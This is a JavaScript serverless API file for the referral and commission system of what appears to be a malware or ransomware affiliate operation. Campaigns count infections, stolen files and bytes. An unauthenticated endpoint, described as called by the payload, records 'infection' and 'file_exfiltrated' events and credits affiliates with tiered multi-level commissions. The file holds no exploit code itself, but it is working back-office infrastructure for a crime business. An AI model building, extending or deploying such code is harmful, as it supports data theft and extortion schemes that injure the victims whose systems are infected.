// vercel-dashboard/api/affiliates/referrals.js
// Referral Tracking API

import { kv } from '../../lib/kv.js';

export default async function handler(request, response) {
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (request.method === 'OPTIONS') return response.status(200).end();

  try {
    switch (request.method) {
      case 'GET':
        return await handleGet(request, response);
      case 'POST':
        return await handlePost(request, response);
      case 'PUT':
        return await handlePut(request, response);
      default:
        return response.status(405).json({ error: 'Method not allowed' });
    }
  } catch (error) {
    console.error('Referrals API error:', error);
    return response.status(500).json({ error: 'Internal server error' });
  }
}

// GET /api/affiliates/referrals - Get referrals
async function handleGet(request, response) {
  const { affiliateId, id, status, limit = 50, offset = 0, includeMultiLevel } = request.query;

  // Verify auth
  const auth = await verifyAuth(request);
  if (!auth.valid) return response.status(401).json({ error: 'Unauthorized' });

  const targetAffiliateId = affiliateId || auth.affiliateId;
  if (!targetAffiliateId) return response.status(400).json({ error: 'Affiliate ID required' });

  // Check permissions
  if (auth.role !== 'admin' && targetAffiliateId !== auth.affiliateId) {
    return response.status(403).json({ error: 'Forbidden' });
  }

  if (id) {
    // Single referral detail
    const referral = await kv.get(`referral:${id}`);
    if (!referral) return response.status(404).json({ error: 'Referral not found' });

    // Get earnings for this referral
    const earnings = await kv.lrange(`referral:${id}:earnings`, 0, -1) || [];
    referral.earnings = earnings.map(e => JSON.parse(e));

    // Get campaigns created by referred affiliate
    const referredAffiliate = await kv.get(`affiliate:${referral.referredAffiliateId}`);
    if (referredAffiliate) {
      const campaignIds = await kv.smembers(`affiliate:${referral.referredAffiliateId}:campaigns`) || [];
      referral.campaigns = [];
      for (const cid of campaignIds.slice(0, 20)) {
        const camp = await kv.get(`campaign:${cid}`);
        if (camp) {
          const stats = await kv.hgetall(`campaign:${cid}:stats`);
          referral.campaigns.push({
            id: camp.id,
            name: camp.name,
            status: camp.status,
            createdAt: camp.createdAt,
            stats: {
              totalInfections: parseInt(stats?.totalInfections || '0'),
              totalFiles: parseInt(stats?.totalFiles || '0'),
              totalBytes: parseInt(stats?.totalBytes || '0')
            }
          });
        }
      }
    }

    return response.json(referral);
  }

  // List referrals
  let referralIds = await kv.smembers(`affiliate:${targetAffiliateId}:referrals`) || [];

  // Filter by status
  if (status) {
    const filtered = [];
    for (const rid of referralIds) {
      const ref = await kv.get(`referral:${rid}`);
      if (ref && ref.status === status) filtered.push(rid);
    }
    referralIds = filtered;
  }

  // Sort by creation date (newest first)
  const referralsWithTime = [];
  for (const rid of referralIds) {
    const ref = await kv.get(`referral:${rid}`);
    if (ref) referralsWithTime.push({ id: rid, createdAt: ref.createdAt });
  }
  referralsWithTime.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));

  // Paginate
  const start = parseInt(offset);
  const lim = parseInt(limit);
  const paginatedIds = referralsWithTime.slice(start, start + lim).map(r => r.id);

  const referrals = [];
  for (const rid of paginatedIds) {
    const ref = await kv.get(`referral:${rid}`);
    if (ref) {
      const referred = await kv.get(`affiliate:${ref.referredAffiliateId}`);
      const earnings = await kv.lrange(`referral:${rid}:earnings`, 0, 4) || [];
      const totalEarnings = earnings.reduce((sum, e) => sum + JSON.parse(e).amount, 0);
      
      referrals.push({
        ...ref,
        referredUsername: referred?.username || 'Unknown',
        referredEmail: referred?.email || 'Unknown',
        recentEarnings: earnings.map(e => JSON.parse(e)),
        totalEarnings
      });
    }
  }

  // Include multi-level referrals if requested
  let multilevel = [];
  if (includeMultiLevel === 'true' && auth.role === 'admin') {
    const mlIds = await kv.smembers(`affiliate:${targetAffiliateId}:multilevel`) || [];
    for (const mlid of mlIds.slice(0, 20)) {
      const ml = await kv.get(`multilevel_referral:${mlid}`);
      if (ml) multilevel.push(ml);
    }
  }

  response.json({
    referrals,
    multilevel,
    total: referralIds.length,
    page: Math.floor(start / lim) + 1,
    pageSize: lim
  });
}

// POST /api/affiliates/referrals - Track referral activity (called by payload/system)
async function handlePost(request, response) {
  const { referralCode, campaignId, systemId, action, amount, metadata } = request.body;

  if (!referralCode) return response.status(400).json({ error: 'Referral code required' });
  if (!action) return response.status(400).json({ error: 'Action required' });

  // Find affiliate by referral code
  const affiliateId = await kv.get(`referral_code:${referralCode}`);
  if (!affiliateId) return response.status(404).json({ error: 'Invalid referral code' });

  const affiliate = await kv.get(`affiliate:${affiliateId}`);
  if (!affiliate || affiliate.status !== 'active') {
    return response.status(404).json({ error: 'Affiliate not found or inactive' });
  }

  // Get the referral record
  const referralIds = await kv.smembers(`affiliate:${affiliateId}:referrals`) || [];
  let referral = null;
  for (const rid of referralIds) {
    const r = await kv.get(`referral:${rid}`);
    if (r && r.referredAffiliateId) {
      // Check if this referral's referred affiliate created the campaign/system
      if (campaignId) {
        const camp = await kv.get(`campaign:${campaignId}`);
        if (camp && camp.affiliateId === r.referredAffiliateId) {
          referral = r;
          break;
        }
      }
      if (systemId) {
        const sys = await kv.get(`system:${systemId}`);
        if (sys && sys.campaignId) {
          const camp = await kv.get(`campaign:${sys.campaignId}`);
          if (camp && camp.affiliateId === r.referredAffiliateId) {
            referral = r;
            break;
          }
        }
      }
    }
  }

  if (!referral) {
    // Try to find by campaign's affiliate
    if (campaignId) {
      const camp = await kv.get(`campaign:${campaignId}`);
      if (camp && camp.affiliateId) {
        // Find referral linking this affiliate to the campaign's affiliate
        for (const rid of referralIds) {
          const r = await kv.get(`referral:${rid}`);
          if (r && r.referredAffiliateId === camp.affiliateId) {
            referral = r;
            break;
          }
        }
      }
    }
  }

  if (!referral) {
    return response.status(404).json({ error: 'No matching referral found' });
  }

  const now = new Date().toISOString();
  const updates = { ...referral, lastActivity: now };

  // Handle different actions
  switch (action) {
    case 'campaign_created':
      updates.status = 'active';
      if (!updates.firstCampaignAt) updates.firstCampaignAt = now;
      await kv.hincrby(`affiliate:${affiliateId}:stats`, 'totalCampaignsCreated', 1);
      break;
    
    case 'infection':
      await kv.hincrby(`affiliate:${affiliateId}:stats`, 'totalInfectionsReferred', 1);
      if (!updates.firstInfectionAt) updates.firstInfectionAt = now;
      if (updates.status === 'pending') {
        updates.status = 'qualified';
        updates.qualifiedAt = now;
        await kv.hincrby(`affiliate:${affiliateId}:stats`, 'activeReferrals', 1);
      }
      break;
    
    case 'file_exfiltrated':
    case 'payment_received':
    case 'commission_earned':
      if (amount && amount > 0) {
        const commission = amount * (referral.commissionRate || affiliate.commissionRate || 0.20);
        const earning = {
          id: `earn_${Date.now()}_${Math.random().toString(36).substring(7)}`,
          referralId: referral.id,
          action,
          amount: parseFloat(amount.toFixed(2)),
          commission: parseFloat(commission.toFixed(2)),
          currency: metadata?.currency || 'USD',
          campaignId,
          systemId,
          metadata,
          createdAt: now
        };
        
        await Promise.all([
          kv.lpush(`referral:${referral.id}:earnings`, JSON.stringify(earning)),
          kv.ltrim(`referral:${referral.id}:earnings`, 0, 999),
          kv.hincrbyfloat(`affiliate:${affiliateId}:stats`, 'pendingEarnings', commission),
          kv.hincrbyfloat(`affiliate:${affiliateId}:stats`, 'totalEarnings', commission)
        ]);

        // Multi-level commissions
        await processMultiLevelCommissions(affiliateId, referral.referredAffiliateId, commission, action, now);

        if (!updates.firstEarningAt) updates.firstEarningAt = now;
      }
      break;
    
    case 'payout':
      if (amount) {
        await kv.hincrbyfloat(`affiliate:${affiliateId}:stats`, 'pendingEarnings', -Math.abs(amount));
        await kv.hincrbyfloat(`affiliate:${affiliateId}:stats`, 'paidOut', Math.abs(amount));
      }
      break;
  }

  await kv.set(`referral:${referral.id}`, updates);

  // Track in affiliate's referral activity log
  await kv.lpush(`affiliate:${affiliateId}:referral_activity`, JSON.stringify({
    referralId: referral.id,
    action,
    amount: amount || 0,
    commission: amount ? (amount * (referral.commissionRate || 0.20)) : 0,
    campaignId,
    systemId,
    createdAt: now
  }));
  await kv.ltrim(`affiliate:${affiliateId}:referral_activity`, 0, 499);

  response.json({ success: true, referralId: referral.id, commission: amount ? amount * (referral.commissionRate || 0.20) : 0 });
}

// PUT /api/affiliates/referrals - Update referral status
async function handlePut(request, response) {
  const { id, ...updates } = request.body;
  if (!id) return response.status(400).json({ error: 'Referral ID required' });

  const auth = await verifyAuth(request);
  if (!auth.valid) return response.status(401).json({ error: 'Unauthorized' });

  const referral = await kv.get(`referral:${id}`);
  if (!referral) return response.status(404).json({ error: 'Referral not found' });

  // Check permissions
  if (auth.role !== 'admin' && referral.affiliateId !== auth.affiliateId) {
    return response.status(403).json({ error: 'Forbidden' });
  }

  const updated = { ...referral, ...updates, updatedAt: new Date().toISOString() };
  await kv.set(`referral:${id}`, updated);

  response.json(updated);
}

// ============ HELPER FUNCTIONS ============

async function verifyAuth(request) {
  const authHeader = request.headers['authorization']?.replace('Bearer ', '');
  if (!authHeader) return { valid: false };

  // Check master key
  if (authHeader === process.env.MASTER_API_KEY) {
    return { valid: true, role: 'admin', affiliateId: null };
  }

  // Check session
  const session = await kv.get(`session:${authHeader}`);
  if (session && new Date(session.expiresAt) > new Date()) {
    return { valid: true, role: 'affiliate', affiliateId: session.affiliateId };
  }

  // Check API key
  const affiliateIds = await kv.smembers('global:affiliates') || [];
  for (const aid of affiliateIds) {
    const a = await kv.get(`affiliate:${aid}`);
    if (a && a.apiKey === authHeader) {
      return { valid: true, role: 'affiliate', affiliateId: aid };
    }
  }

  return { valid: false };
}

async function processMultiLevelCommissions(rootAffiliateId, leafAffiliateId, commission, action, timestamp) {
  // Level 2 (5%)
  const mlRefs2 = await kv.smembers(`affiliate:${rootAffiliateId}:multilevel`) || [];
  for (const mlid of mlRefs2) {
    const ml = await kv.get(`multilevel_referral:${mlid}`);
    if (ml && ml.leafAffiliateId === leafAffiliateId && ml.level === 2) {
      const l2Commission = commission * 0.25; // 25% of the commission (5% of original)
      await kv.hincrbyfloat(`affiliate:${ml.rootAffiliateId}:stats`, 'pendingEarnings', l2Commission);
      await kv.hincrbyfloat(`affiliate:${ml.rootAffiliateId}:stats`, 'totalEarnings', l2Commission);
      await kv.lpush(`affiliate:${ml.rootAffiliateId}:referral_activity`, JSON.stringify({
        referralId: ml.id,
        action: `multilevel_${action}`,
        amount: commission,
        commission: l2Commission,
        level: 2,
        createdAt: timestamp
      }));
    }
  }

  // Level 3 (2%)
  for (const mlid of mlRefs2) {
    const ml = await kv.get(`multilevel_referral:${mlid}`);
    if (ml && ml.level === 2) {
      // Find level 3 referrals from this intermediate
      const mlRefs3 = await kv.smembers(`affiliate:${ml.intermediateAffiliateId}:multilevel`) || [];
      for (const mlid3 of mlRefs3) {
        const ml3 = await kv.get(`multilevel_referral:${mlid3}`);
        if (ml3 && ml3.leafAffiliateId === leafAffiliateId && ml3.level === 3) {
          const l3Commission = commission * 0.10; // 10% of the commission (2% of original)
          await kv.hincrbyfloat(`affiliate:${ml3.rootAffiliateId}:stats`, 'pendingEarnings', l3Commission);
          await kv.hincrbyfloat(`affiliate:${ml3.rootAffiliateId}:stats`, 'totalEarnings', l3Commission);
          await kv.lpush(`affiliate:${ml3.rootAffiliateId}:referral_activity`, JSON.stringify({
            referralId: ml3.id,
            action: `multilevel_${action}`,
            amount: commission,
            commission: l3Commission,
            level: 3,
            createdAt: timestamp
          }));
        }
      }
    }
  }
}
